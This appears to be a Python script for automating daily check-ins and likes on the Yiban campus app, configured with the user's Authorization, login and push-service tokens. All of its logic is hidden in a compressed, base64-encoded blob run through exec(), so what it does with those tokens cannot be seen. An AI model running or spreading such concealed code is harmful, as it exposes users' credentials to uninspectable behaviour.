# --encoding:utf-8 -- #
"""
    
    联系方式:110

    易班

    ver 1.0

    2024.6.17

    实现 每日签到 点赞

    环境变量名:yuanshen_yb

    参数:
    Authorization loginToken orgId 其中 orgId位于 含getRecommend的url中
    
    群发wxpusher 提取 appToken topicid 

    格式:export yuanshen_yb = 备注#Authorization#loginToken#appToken#topicid#orgId

    定时 每天9点一次
    cron: 0 0 9 * * ? 

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------
try:
    import bz2, base64
    exec(bz2.decompress(base64.b64decode('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')))
except Exception as e:
    print("脚本执行出错：",str(e))
